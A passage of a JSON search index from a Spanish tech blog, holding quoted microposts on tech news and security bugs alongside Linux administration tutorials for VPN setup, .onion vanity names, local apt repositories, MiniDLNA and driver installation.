III » IV » V » VI » VII Mercé Molist | elmundo.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/07/donde-aprendieron-los-hackers-a-ser-hackers/","loc":"https://karpoke.ignaciocano.com/2014/12/07/donde-aprendieron-los-hackers-a-ser-hackers/"},{"title":"¿Por qué le darán el Oscar Honorífico a Hayao Miyazaki?","text":"La razón por la que eligieron a Miyazaki para el Oscar, que será otorgado en una ceremonia privada en la sala Ray Dolby, del Hollywood & Highland Center, es porque este director ha hecho soñar a muchas personas alrededor del mundo con sus historias , con sus dibujos, con sus encantadores personajes, en fin porque es un grande . Ivonne Lara | hipertextual.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/07/por-que-le-daran-el-oscar-honorifico-a-hayao-miyazaki/","loc":"https://karpoke.ignaciocano.com/2014/12/07/por-que-le-daran-el-oscar-honorifico-a-hayao-miyazaki/"},{"title":"Ya puedes jugar a todas las máquinas recreativas de tu infancia gratis","text":"¿Conocéis Archive.org? Es una organización sin ánimo de lucro que desde 1996 y con sede en San Francisco, se dedica a recopilar y archivar \"textos, audio, imágenes en movimiento, y software, así como páginas web\" para ponerlos a disposición de todos nosotros de forma gratuita. Desde la organización tuvieron la genial idea de recopilar 900 videojuegos Arcade creados desde 1970 a 1990 y ofrecérnoslos gratuitamente, on-line, para deleite y regocijo nuestro. » archive.org » The InternetArcade » yofuiaegb.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/06/ya-puedes-jugar-a-todas-las-maquinas-recreativas-de-tu-infancia-gratis/","loc":"https://karpoke.ignaciocano.com/2014/12/06/ya-puedes-jugar-a-todas-las-maquinas-recreativas-de-tu-infancia-gratis/"},{"title":"Lo posible de lo imposible: la física de un tsunami","text":"Desde el punto de vista de la física, un tsunami es sencillamente una onda sostenida por la gravedad terrestre (y no por el viento, como las olas de la playa. Tampoco es correcta la denominación de \"ondas de marea\", ya que no son las mareas la razón de su origen) en aguas poco profundas. Agatha | eltercerprecog.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/12/01/lo-posible-de-lo-imposible-la-fisica-de-un-tsunami/","loc":"https://karpoke.ignaciocano.com/2014/12/01/lo-posible-de-lo-imposible-la-fisica-de-un-tsunami/"},{"title":"The programmer's price","text":"Finally, Bradley received an e-mail from 10x, a talent company. 10x was started by two music and entertainment managers, Michael Solomon and Rishon Blumberg, who for the past nineteen years have represented rock stars, including John Mayer and Vanessa Carlton. Recently, in the wake of the digital revolution and the music industry's implosion, Solomon and Blumberg have begun serving as agents for technologists. 10x claims to represent digital \"rock stars\"; the company's name comes from the idea, well established in the tech world, that the very best programmers are superstars, capable of achieving ten times the productivity of their merely competent colleagues. In HBO's \"Silicon Valley,\" a self-effacing character named Big Head compliments his friend's coding skills by saying, \"Richard's a 10xer. I'm, like, barely an xer.\" Lizzie Widdicombe | newy orker.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/23/the-programmers-price/","loc":"https://karpoke.ignaciocano.com/2014/11/23/the-programmers-price/"},{"title":"This is how we ZenPayroll: Our Development Workflow","text":"A lot of engineers looking to join ZenPayroll are interested in hearing more about our development workflow. Put more simply, how do ZenPayrollers write software? The answer to that is constantly changing, as we're always refining our workflows to fit our ever changing needs, but I'll cover in some detail the way we do things today. Edward Kim | engineering.zenpayroll.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/23/this-is-how-we-zenpayroll-our-development-workflow/","loc":"https://karpoke.ignaciocano.com/2014/11/23/this-is-how-we-zenpayroll-our-development-workflow/"},{"title":"The Man Who Made 'Tetris'","text":"Tetris was formally released in June 1984 by the Academy of Sciences, after initially spreading among academics and the computer literate by way of copied floppy disks. As a tile-fitting puzzler, Tetris captivated these members of intelligentsia. After all, here was a game constructed of pristine shapes taken straight from Platonic idealism. Jagger Gravning | motherboard.vice.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/23/the-man-who-made-tetris/","loc":"https://karpoke.ignaciocano.com/2014/11/23/the-man-who-made-tetris/"},{"title":"Celebra, Dragon Ball cumple 30 años","text":"Ha pasado mucho tiempo luego de que apareciera por primera vez la historia de Dragon Ball. 30 años en que su creador, Akira Toriyama, publicara la historia de un pequeño niño que juntos a sus amigos buscaban unas esferas mágicas que al reunirlas podrían pedir un deseo. Ivonne Lara | hipertextual.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/22/celebra-dragon-ball-cumple-30-anos/","loc":"https://karpoke.ignaciocano.com/2014/11/22/celebra-dragon-ball-cumple-30-anos/"},{"title":"Daft Punk, el dúo francés que revolucionó la música electrónica","text":"Han pasado 20 años desde el nacimiento de Daft Punk, y apenas llevan llevan cuatro álbumes de estudio (además de una banda sonora para película que, para algunos, cuenta como un quinto álbum), pero es tanto lo que han cambiado y es tanto lo que nos han sorprendido, que su meta fue cumplida, revolucionaron la música electrónica. Eduardo Marin | hipertextual.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/22/daft-punk-el-duo-frances-que-revoluciono-la-musica-electronica/","loc":"https://karpoke.ignaciocano.com/2014/11/22/daft-punk-el-duo-frances-que-revoluciono-la-musica-electronica/"},{"title":"Everything you need to know about the Shellshock Bash bug","text":"Remember Heartbleed? If you believe the hype today, Shellshock is in that league and with an equally awesome name albeit bereft of a cool logo (someone in the marketing department of these vulns needs to get on that). But in all seriousness, it does have the potential to be a biggie and as I did with Heartbleed, I wanted to put together something definitive both for me to get to grips with the situation and for others to dissect the hype from the true underlying risk. Troy Hunt | troyhunt.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/14/everything-you-need-to-know-about-the-shellshock-bash-bug/","loc":"https://karpoke.ignaciocano.com/2014/11/14/everything-you-need-to-know-about-the-shellshock-bash-bug/"},{"title":"Everything you need to know about the Heartbleed SSL bug","text":"Every now and then in the world of security, something rather serious and broad-reaching happens and we all run around like headless chicken wondering what on earth it means. Did the NSA finally \"get us\"? Is SSL dead? Is the sky falling? Well it's bad, but not for everyone and quite possibly not as bad as many are saying it is. Troy Hunt | troyhunt.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/14/everything-you-need-to-know-about-the-heartbleed-ssl-bug/","loc":"https://karpoke.ignaciocano.com/2014/11/14/everything-you-need-to-know-about-the-heartbleed-ssl-bug/"},{"title":"POODLE attacks on SSLv3","text":"My colleague, Bodo M ller, in collaboration with Thai Duong and Krzysztof Kotowicz (also Googlers), just posted details about a padding oracle attack against CBC-mode ciphers in SSLv3. This attack, called POODLE, is similar to the BEAST attack and also allows a network attacker to extract the plaintext of targeted parts of an SSL connection, usually cookie data. Unlike the BEAST attack, it doesn't require such extensive control of the format of the plaintext and thus is more practical. Fundamentally, the design flaw in SSL/TLS that allows this is the same as with Lucky13 and Vaudenay's two attacks: SSL got encryption and authentication the wrong way around – it authenticates before encrypting. Adam Langley | imperialviolet.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/14/poodle-attacks-on-sslv3/","loc":"https://karpoke.ignaciocano.com/2014/11/14/poodle-attacks-on-sslv3/"},{"title":"FrootVPN, servicio VPN anónimo y gratuito para Android y Ubuntu","text":"FrootVPN es un servicio VPN que se anuncia enfocado a preservar la privacidad y el anonimato, a la par que gratuito. Mediante el uso de un servicio como éste, podremos conectarnos a Internet de forma segura y anónima desde sitios que pudieran no serlo, por ejemplo, redes abiertas que no usan cifrado, servicios que restringen el acceso por país, países que censuran la libertad de expresión o el acceso a la cultura, etc. Por supuesto, dado que todo nuestro tráfico irá a través de un tercero, no estaría demás tomar medidas adicionales como usar HTTPS, o no acceder en la medida de lo posible a servicios delicados como banca electrónica. El primer paso antes de configurar nuestro PC o móvil es crear una cuenta en su web. Android Conectar desde Android es tan sencillo como crear una conexión VPN nueva. Vamos al menú Ajustes > Más > VPN > Añadir, y rellenamos los datos: |Parámetro |Valor | |------------------------|---------------------| |Tipo |L2TP/IPSec PSK | |Dirección del servidor |se-vpn.frootvpn.com | |Clave compartida |frootvpnsecret | Le damos a conectar e introducimos nuestro usuario y contraseña. Ubuntu Conectar desde Ubuntu es casi tan sencillo como en Android. Antes que nada, comprobamos que tenemos instalamos el paquete openvpn , disponible en los repositorios. Descargarmaos el fichero de configuración desde su página: bash $ wget https://www.frootvpn.com/files/frootvpn.ovpn $ sudo mv frootvpn.ovpn /etc/openvpn/ Y nos conectamos simplemente ejecutando: bash $ sudo openvpn --config /etc/openvpn/frootvpn.ovpn Si tuviéramos problemas al conectar a alguna web, añadir la siguiente línea en el fichero /etc/resolv.conf (o en /etc/resolvconf/resolv.conf.d/base si usamos resolvconf ) podría servir: bash nameserver 80.67.0.2 Configurar FrootVPN con Network Manager Si utilizamos NetworkManager y queremos configurar la conexión a través de él, nos encontraremos que crear la conexión importando el fichero de configuración que nos hemos descargado no nos funciona. Si ni siquiera nos aparece la opción de configurar redes VPN, deberemos instalar el paquete network-manager-openvpn . Para que nos funcione la conexión desde NetworkManager , primero creamos el fichero /etc/openvpn/frootvpn.crt y en él copiamos los certificados que están contenidos en frootvpn.ovpn : ```bash $ sudo su cp /etc/openvpn/frootvpn.{ovpn,crt} sed -n '/-----BEGIN/,/-----END/p' /etc/openvpn/frootvpn.crt | sponge /etc/openvpn/frootvpn.crt ``` Después, vamos al menú de gestión de redes > Conexiones VPN > Configurar VPN > Añadir > Importar una configuración VPN guardada, y seleccionamos el fichero que nos hemos descargado. En la pantalla de configuración, cambiaremos: el tipo de autenticación: contraseña pondremos nuestro usuario y contraseña en el certificado CA seleccionaremos el fichero /etc/openvpn/frootvpn.crt Y ya está. Referencias » frootvpn.com - Ernesto | Which VPN services take your anonymity seriously? 2014 edition » PPTP vs L2TP/IPSEC vs OpenVPN","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/11/14/frootvpn-servicio-vpn-anonimo-y-gratuito-para-android-y-ubuntu/","loc":"https://karpoke.ignaciocano.com/2014/11/14/frootvpn-servicio-vpn-anonimo-y-gratuito-para-android-y-ubuntu/"},{"title":"Traducción de la Nota G","text":"La Máquina Analítica no tiene ninguna pretensión de producir nada. Puede hacer cualquier cosa que sepamos cómo ordenarle que haga. Puede seguir un análisis; pero no tiene la capacidad de anticipar ninguna relación o verdad analíticas. Su función es ayudarnos a hacer accesible aquello con lo que ya estamos familiarizados. Está diseñada para hacer esto principalmente, claro está, por medio de sus facultades ejecutivas; pero es probable que ejerza de otra manera una influencia indirecta y recíproca sobre la propia ciencia. Porque, al distribuir y combinar las verdades y las fórmulas del análisis, de manera que las combinaciones mecánicas de la máquina las puedan manejar con mayor rapidez y facilidad, las relaciones y la naturaleza de muchas cuestiones de la ciencia quedarán bañadas en otra luz y podrán investigarse en mayor profundidad. Sin duda, esto es una consecuencia indirecta y, en parte, especulativa, de tal invento. Sin embargo, es evidente que, en general, al concebir una nueva forma de registrar verdades matemáticas y arrojarlas para su uso, es probable que nos inspiren nuevas perspectivas que, de nuevo, deben reaccionar en la fase más teórica del asunto. Todas las ampliaciones del poder humano, o aumentos del conocimiento humano, conllevan siempre varias influencias colaterales, aparte de los objetivos principal y secundario obtenidos. Gabriel Rodríguez Alberich | notage.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/14/traduccion-de-la-nota-g/","loc":"https://karpoke.ignaciocano.com/2014/11/14/traduccion-de-la-nota-g/"},{"title":"Creando un dominio .onion (más o menos) personalizado","text":"Hace unos días salió a la luz que Facebook estaba disponible a través de un dominio .onion en la red Tor. Las direcciones .onion se crean al aplicar una codificación base32 a los primeros 80 bytes del hash SHA1 de la clave privada del servidor . Sabiendo esto, crear una dirección que contenga palabras clave concretas es cuestión de fuerza bruta y tiempo. Un programa que nos servirá para crear dominios que cumplan con nuestros requisitos es Shallot . Descarga y compilación bash $ git clone https://github.com/katmagic/Shallot.git $ cd Shallot $ ./configure $ make Uso Su uso es sencillo: bash $ ./shallot &#94;test Rendimiento Tiempo estimado para generar un dominio con un procesador a 1.5Ghz: | Caracteres | Tiempo aproximado | |------------|----------------------| | \\<4 | menos de 1 segundo | | 4 | 2 segundos | | 5 | 1 minuto | | 6 | 30 minutos | | 7 | 1 día | | 8 | 25 días | | 9 | 1 año | | 10 | 40 años | | 11 | 640 años | | 12 | 10 mil años | | 13 | 160 mil años | | 14 | 2.6 millones de años | Referencias » Servicios ocultos en la red Tor","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/11/14/creando-un-dominio-onion-mas-o-menos-personalizado/","loc":"https://karpoke.ignaciocano.com/2014/11/14/creando-un-dominio-onion-mas-o-menos-personalizado/"},{"title":"Solucionado el error «ImportError: No module named _sysconfigdata_nd» en Ubuntu","text":"Si estando en un entorno virtual, nos encontramos con el error: bash ImportError: No module named _sysconfigdata_nd Es debido a un conocido error en Ubuntu , por el cual dicho fichero se encuentra en otra ubicación, en lugar de /usr/lib/python2.7 . En 32 bits: bash $ dpkg -S _sysconfigdata_nd.py libpython2.7-minimal:i386: /usr/lib/python2.7/plat-i386-linux-gnu/_sysconfigdata_nd.py En 64 bits: ```bash $ dpkg -S _sysconfigdata_nd.py libpython2.7-minimal:amd64: /usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.py ``` Una manera de evitarlo es crear un enlace simbólico: bash $ cd /usr/lib/python2.7 $ sudo ln -s plat-*/_sysconfigdata_nd.py .","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/11/13/solucionado-el-error-importerror-no-module-named-_sysconfigdata_nd-en-ubuntu/","loc":"https://karpoke.ignaciocano.com/2014/11/13/solucionado-el-error-importerror-no-module-named-_sysconfigdata_nd-en-ubuntu/"},{"title":"Crear un repositorio de paquetes local","text":"Al instalar algunos programas a partir del código fuente, tenemos la opción de crear paquetes .deb mediante checkinstall , de tal forma que nos sea más sencillo reinstalarlos, o instalarlos en otros equipos. La idea es crear un repositorio local que podamos acceder mediante apt-get o aptitude , y así podemos delegar la instalación de dependencias. Directorio Si el número de paquetes es relativamente pequeño, de una misma distribución, de una sola arquitectura, etc, lo único que necesitamos es crear un listado de los paquetes disponibles y añadirlo como fuente en el sources.list . Si no es el caso, ya sea porque tenemos paquetes para diferentes distribuciones o diferentes arquitecturas, deberemos organizar los paquetes siguiendo una jerarquía concreta. Antes de continuar, instalaremos el paquete apt-dev , el cual contiene las herramientas necesarias. Supongamos que tenemos los paquetes en el directorio /var/local/deb . Para crear el listado de paquetes ejecutamos: ```bash $ cd /var/local/deb $ sudo su dpkg-scanpackages . /dev/null | gzip -9c > Packages.gz ``` Deberemos ejecutar ese comando cada vez que añadamos o eliminemos un nuevo paquete. El siguiente paso es actualizar el fichero de fuentes /etc/apt/sources.list , añadiendo la línea: bash deb file:/var/local/deb ./ Una vez actualizada la lista de paquetes disponibles, ya podremos instalarlos normalmente: bash $ sudo aptitude update CD ROM Ya no es algo tan común, pero si necesitamos grabar los paquetes en un CD, basta ejecutar el siguiente comando para tener ese CD como fuente: bash $ sudo apt-cdrom add","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/11/12/crear-un-repositorio-de-paquetes-local/","loc":"https://karpoke.ignaciocano.com/2014/11/12/crear-un-repositorio-de-paquetes-local/"},{"title":"MiniDLNA en Ubuntu Trusty Tahr","text":"DLNA define las especificaciones para compartir contenido multimedia entre diferentes dispositivos mediante el uso de protocolos UPnP. Instalaremos un servidor DLNA en Ubuntu Trusty Tahr, MiniDLNA (ahora se llama ReadyMedia), que nos permitirá, por ejemplo, ver películas, escuchar música o ver fotos en el portátil, el móvil o la televisión. Actualmente, no se encuentra en los repositorios, así que lo instalaremos a partir del código fuente. (Otra alternativa sería usar algún repositorio PPA que ya contenga el paquete compilado.) Compilación Antes de compilarlo, nos aseguramos de que tenemos las herramientas necesarias instaladas: bash $ sudo aptitude install autoconf g++ subversion linux-source linux-headers-`uname -r` build-essential tofrodos git-core subversion dos2unix make gcc automake cmake checkinstall git-core dpkg-dev fakeroot pbuilder dh-make debhelper devscripts patchutils quilt git-buildpackage pristine-tar git yasm checkinstall cvs mercurial También nos aseguraremos de que tenemos las dependencias instaladas: bash $ sudo aptitude install libexif12 libexif-dev libjpeg8-dev libjpeg-dev libjpeg-turbo8 libjpeg-turbo8-dev libid3tag0 libid3tag0-dev libflac8 libflac-dev libvorbis0a libvorbisenc2 libvorbisfile3 libvorbis-dev libsqlite3-0 libsqlite3-dev libavformat54 libavformat-dev Descargamos el código fuente y lo compilamos: bash $ git clone git://git.code.sf.net/p/minidlna/git minidlna-git $ cd minidlna-git $ ./autogen.sh $ ./configure $ make Ahora podemos, o bien instalarlo directamente: bash $ sudo make install o bien crear un paquete .deb con checkinstall : bash $ sudo checkinstall Configuración Creamos el directorio donde guardaremos la configuración: bash $ mkdir ~/.minidlna Partiremos del fichero de configuración que viene en el código: bash $ cp minidlna.conf ~/.minidlna/minidlna.conf En el fichero de configuración, deberemos especificar con qué usuario se debe ejecutar el servicio, qué directorio contiene los archivos multimedia y dónde deberá guardar la base de datos que utiliza: bash user=user media_dir=/media/share db_dir=/home/user/.minidlna Ejecución Para lanzar el servicio: bash $ /usr/local/sbin/minidlnad -f ~/.minidlna/minidlna.conf Si vemos que necesitamos que reindexe los contenidos: bash $ /usr/local/sbin/minidlnad -R -f ~/.minidlna/minidlna.conf Cortafuegos Deberemos asegurarnos de que el puerto que hayamos configurado, por defecto el 8200, sea accesible. También el puerto UDP 1900 . Por ejemplo, si queremos permitir únicamente el acceso dentro de la propia LAN y usamos ufw : bash $ sudo ufw allow proto tcp from 192.168.50.0/24 to any port 8200 $ sudo ufw allow proto udp from 192.168.50.0/24 to any port 1900 Clientes En cualquier PC de escritorio, mediante VLC podemos reproducir el contenido servido a través de MiniDLNA. Basta que vayamos al menú Red local > Universal Plug'n'Play . De hecho, si tenemos los archivos de subtítulos en el servidor, también es capaz de incluirlos automáticamente. En Android, la aplicación Media House nos permitirá reproducir el contenido. Ejecución al inicio Si queremos que el servicio arranque al inicio, podemos utilizar el siguiente script : ```bash !/bin/sh Mini DLNA BEGIN INIT INFO Provides: scriptname Required-Start: $remote_fs $syslog Required-Stop: $remote_fs $syslog Default-Start: 2 3 4 5 Default-Stop: 0 1 6 Short-Description: Start daemon at boot time Description: Enable service provided by daemon. END INIT INFO case \"$1\" in 'start') /usr/local/sbin/minidlnad -f /home/user/.minidlna/minidlna.conf echo Started ;; 'stop') PID= /bin/pidof minidlnad if [ ${PID} ]; then sudo kill -SIGTERM ${PID} else echo Already Stopped fi ;; 'restart') PID= /bin/pidof minidlnad if [ ${PID} ]; then sudo kill -SIGTERM ${PID} fi /usr/local/sbin/minidlnad -f /home/user/.minidlna/minidlna.conf echo Restarted ;; 'status') PID= /bin/pidof minidlnad if [ ${PID} ]; then echo Running. Process ${PID} else echo Stopped fi ;; 'rescan') PID= /bin/pidof minidlnad if [ ${PID} ]; then sudo kill -SIGTERM ${PID} fi /usr/local/sbin/minidlnad -R -f /home/user/.minidlna/minidlna.conf echo Rescanning ;; *) echo \"Usage: $0 { start | stop | restart | status | rescan }\" ;; esac exit 0 ``` Lo guardamos en /etc/init.d/minidlna y configuramos el arranque: ```bash $ sudo chmod +x /etc/init.d/minidlna $ sudo update-rc.d minidlna defaults Adding system startup for /etc/init.d/minidlna ... /etc/rc0.d/K20minidlna -> ../init.d/minidlna /etc/rc1.d/K20minidlna -> ../init.d/minidlna /etc/rc6.d/K20minidlna -> ../init.d/minidlna /etc/rc2.d/S20minidlna -> ../init.d/minidlna /etc/rc3.d/S20minidlna -> ../init.d/minidlna /etc/rc4.d/S20minidlna -> ../init.d/minidlna /etc/rc5.d/S20minidlna -> ../init.d/minidlna ``` Actualizaciones Cuando haya actualizaciones del código, podemos repetir el proceso de compilación: bash $ cd minidlna-git $ make distclean $ git pull $ ./configure $ make $ sudo checkinstall Desinstalación Si queremos desinstalarlo, no tenemos más que: bash $ sudo aptitude purge minidlna $ sudo update-rc.d -f minidlna remove $ sudo rm /etc/init.d/minidlna $ sudo rm -r /home/user/.minidlna Referencias Anand Subramanian | The Ultimate Guide to Compile and Install MiniDLNA on Ubuntu Justin Maggard | MiniDLNA (ReadyMedia)","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/11/11/minidlna-en-ubuntu-trusty-tahr/","loc":"https://karpoke.ignaciocano.com/2014/11/11/minidlna-en-ubuntu-trusty-tahr/"},{"title":"chmod sin chmod","text":"Durante la desventura de pasar de 32 a 64 bits, tuve el placer de quedarme sin poder ejecutar ningún binario, ya que estos se habían sobreescrito por sus versiones compiladas para la arquitectura de 64 bits mientras aún continuaba con la de 32. Ni ls , ni rm , ni mv , ni cp , ni dpkg ... nada. Ni tampoco USB, ni ssh , y no podía reiniciar aún; un entorno idílico, vamos. El tema está en que, en un momento dado, necesité hacer uso de las versiones compiladas para 32 bits. Pude descargar aquellos binarios que necesitaba, pero no tenían permisos de ejecución y tampoco podía usar /bin/chmod . Por suerte, ya había alguien que se había imaginado un escenario sin chmod y había recopilado toda una serie de alternativas. Ésta es la que yo usé: bash $ /lib/ld-linux.so.2 ~/chmod +x ~/rm En 64 bits, el comando sería ligeramente diferente: bash $ /lib64/ld-linux-x86-64.so.2 /bin/chmod +x /bin/chmod","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/11/08/chmod-sin-chmod/","loc":"https://karpoke.ignaciocano.com/2014/11/08/chmod-sin-chmod/"},{"title":"How To Become A Hacker","text":"There is a community, a shared culture, of expert programmers and networking wizards that traces its history back through decades to the first time-sharing minicomputers and the earliest ARPAnet experiments. The members of this culture originated the term 'hacker'. Hackers built the Internet. Hackers made the Unix operating system what it is today. Hackers make the World Wide Web work. If you are part of this culture, if you have contributed to it and other people in it know who you are and call you a hacker, you're a hacker. Eric Steven Raymond | catb.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/08/how-to-become-a-hacker/","loc":"https://karpoke.ignaciocano.com/2014/11/08/how-to-become-a-hacker/"},{"title":"Instalar el controlador libre para Broadcom BCM4312 en Ubuntu Trusty Thar","text":"Al actualizar Ubuntu 14.04 de 32 a 64 bits, se eliminaron los controladores de la tarjeta de red inalámbrica. Reinstalar el controlador libre es sencillo. Antes que nada, necesitamos saber qué chipset tiene, el identificador y qué módulo carga el kernel (si es que tenemos algún controlador en uso): bash $ lspci -vvnn | grep -A 9 Network 04:00.0 Network controller [0280]: Broadcom Corporation BCM4312 802.11b/g LP-PHY [14e4:4315] (rev 01) Subsystem: Dell Wireless 1397 WLAN Mini-Card [1028:000c] Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx- Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- SERR- Chipset: BCM4312 PCI ID: 14e4:4315 Controlador en uso: Ninguno (no aparece la línea que lo debería indicar) Instalamos el paquete necesario (si no tenemos conexión, deberemos conectarnos por cable o bien descargarlo desde otro equipo; más información en el enlace al final): bash $ sudo aptitude install firmware-b43-installer Al cabo de unos segundos, ya deberíamos poder usar la red inalámbrica. deauthenticating from 00:00:00:11:22:33 by local (reason=3) Si nos encontramos con que no tenermina de conectar y en los logs aparece algo como: bash [ 123.456789] wlan0: deauthenticating from 00:00:00:11:22:33 by local choice (reason=3) podría ser debido a que el controlador que estábamos usando no se ha descargado correctamente . En principio, tras reiniciar ya no deberíamos tener este problema. Referencias » Community Help Wiki | WifiDocs/Driver/bcm43xx » b43 and b43legacy","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/11/07/instalar-el-controlador-libre-para-broadcom-bcm4312-en-ubuntu-trusty-thar/","loc":"https://karpoke.ignaciocano.com/2014/11/07/instalar-el-controlador-libre-para-broadcom-bcm4312-en-ubuntu-trusty-thar/"},{"title":"Secure messaging scorecard","text":"In the face of widespread Internet surveillance, we need a secure and practical means of talking to each other from our phones and computers. Many companies offer \"secure messaging\" products\"but are these systems actually secure? We decided to find out, in the first phase of a new EFF Campaign for Secure & Usable Crypto. » eff.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/07/secure-messaging-scorecard/","loc":"https://karpoke.ignaciocano.com/2014/11/07/secure-messaging-scorecard/"},{"title":"Cómo 'hackear' un ordenador con la radio del móvil","text":"El sistema truca las ondas electromagnéticas del monitor. De esta forma se puede transmitir información desde la pantalla a un teléfono que esté a menos de siete metros, con un ancho de banda de hasta 60 bytes por segundo, suficientes para obtener una contraseña en ocho segundos, según aseguran los investigadores. Sergio Ferrer | elconfidencial.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/04/como-hackear-un-ordenador-con-la-radio-del-movil/","loc":"https://karpoke.ignaciocano.com/2014/11/04/como-hackear-un-ordenador-con-la-radio-del-movil/"},{"title":"Early Digital Research CP/M Source Code","text":"Computer Scientist Gary Kildall created just such an operating system in 1974 for a small computer called the \"Intellec-8ó that Intel had designed to showcase their new microprocessors. Called \"CP/M\", it was unlike most other operating systems for small computers because it was written in PL/M, a portable higher-level language that he had designed earlier, rather than in the assembly-language of a particular computer. That meant that CP/M could be ported to run on many different personal computers. And if the applications were written in PL/M, they could be ported as well. David Laws | computerhistory.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/03/early-digital-research-cpm-source-code/","loc":"https://karpoke.ignaciocano.com/2014/11/03/early-digital-research-cpm-source-code/"},{"title":"What Every App Developer Should Know About Android","text":"The goal for this research was to identify the most common problems and challenges that Android developers face with the devices they build for. The 288 unique Android device models represent a significant volume of Android use: approximately 92 to 97% of global Android volumes, depending on how it gets measured and what regions and markets are included. This research represents remarkable coverage of Android usage globally, and it shows the most obvious problems as well as the status of Android hardware and software from a developer's point of view. Ville-Veikko Helppi | smashingmagazine.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/11/02/what-every-app-developer-should-know-about-android/","loc":"https://karpoke.ignaciocano.com/2014/11/02/what-every-app-developer-should-know-about-android/"},{"title":"Hackers Are Using Gmail Drafts to Update Their Malware and Steal Data","text":"Researchers at the security startup Shape Security say they've found a strain of malware on a client's network that uses that new, furtive form of \"command and control\"\"the communications channel that connects hackers to their malicious software\"allowing them to send the programs updates and instructions and retrieve stolen data. Because the commands are hidden in unassuming Gmail drafts that are never even sent, the hidden communications channel is particularly difficult to detect. Andy Greenberg | wired.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/10/29/hackers-are-using-gmail-drafts-to-update-their-malware-and-steal-data/","loc":"https://karpoke.ignaciocano.com/2014/10/29/hackers-are-using-gmail-drafts-to-update-their-malware-and-steal-data/"},{"title":"Cómo lancé un proyecto rentable sin escribir ni una línea de código","text":"Pues bien, se trata más bien de un 'side project', es decir, el típico proyecto en el que te embarcas fuera de tu actividad principal, dedicándole o bien pasta o bien algo de tiempo. En mi caso han sido ambas cosas, pero es totalmente compatible con mis otros menesteres, como pegar los carteles de nvivo.es. txantxez | txarly.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/10/26/como-lance-un-proyecto-rentable-sin-escribir-ni-una-linea-de-codigo/","loc":"https://karpoke.ignaciocano.com/2014/10/26/como-lance-un-proyecto-rentable-sin-escribir-ni-una-linea-de-codigo/"},{"title":"What are the chances of survival of individual chess pieces in average games?","text":"In case anyone's wondering how I approached this as a programming problem, a quick trick is to not get drawn into writing a whole chessboard representation. Use a tool like pgn-extract to convert SAN moves (e.g. \"Nc3\") to long algebraic moves (e.g. \"Nb1c3\") - since we can safely assume all moves in the PGN are legal, this saves a lot of effort implementing the rules of chess (although you still have to handle castling and en passant carefully). » png-extract » SurvivingPieces » quora.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/10/26/what-are-the-chances-of-survival-of-individual-chess-pieces-in-average-games/","loc":"https://karpoke.ignaciocano.com/2014/10/26/what-are-the-chances-of-survival-of-individual-chess-pieces-in-average-games/"},{"title":"Happy 10th Birthday, Ubuntu","text":"I'm putting a team of Debian developers together to work full time on a derivative distribution of Debian. The idea is to provide a high-quality regular release based on Debian unstable, ensuring that all patches are given back to Debian, and ensuring that the install disk of our distribution consists entirely of Free software. Martin and I spoke at length about the project and he seemed to like the idea very much. I'm sure he'd be happy to let you know his thoughts directly. If you're interested I'd like to give you a call to discuss it further with you. I'm based in the UK so we're roughly in the same timezone, just let me know when and what number to reach you on. Scott James Remnant | netsplit.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/10/25/happy-10th-birthday-ubuntu/","loc":"https://karpoke.ignaciocano.com/2014/10/25/happy-10th-birthday-ubuntu/"},{"title":"Aprovechan un fallo y le sacan 980.000 dólares a varios casinos","text":"Las máquinas de vídeopóquer Game King llegaron a los casinos en 1970 y fueron un éxito inmediato. Con los años, su software se fue actualizando, incluyendo nuevos juegos y opciones. En 2002 lanzó su quinta gran actualización, que presumía de unos gráficos de calidad nunca vista antes en uno de estos aparatos, así como sonido en estéreo mejorado respecto a versiones anteriores. Lo que este programa incluía también, y nadie se dio cuenta, fueron una serie de sutiles errores de código que tardaron siete años en ser descubiertos. Rocío P. Benavente | elconfidencial.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/10/09/aprovechan-un-fallo-y-le-sacan-980-000-dolares-a-varios-casinos/","loc":"https://karpoke.ignaciocano.com/2014/10/09/aprovechan-un-fallo-y-le-sacan-980-000-dolares-a-varios-casinos/"},{"title":"No Nobel for the Father of the LED","text":"Nick Holonyak Jr., the person widely credited with the development of the first visible-light LED, the device that now lights up countless clocks, traffic signals, and other electronic displays, might be one of them. On Tuesday, the Royal Swedish Academy of Sciences awarded this year's Nobel Prize in Physics to three inventors of the blue light-emitting diode. Holonyak isn't exactly complaining that he isn't among them; his objection is that his 1962 invention has never been singled out for recognition by the academy. Rachel Courtland | 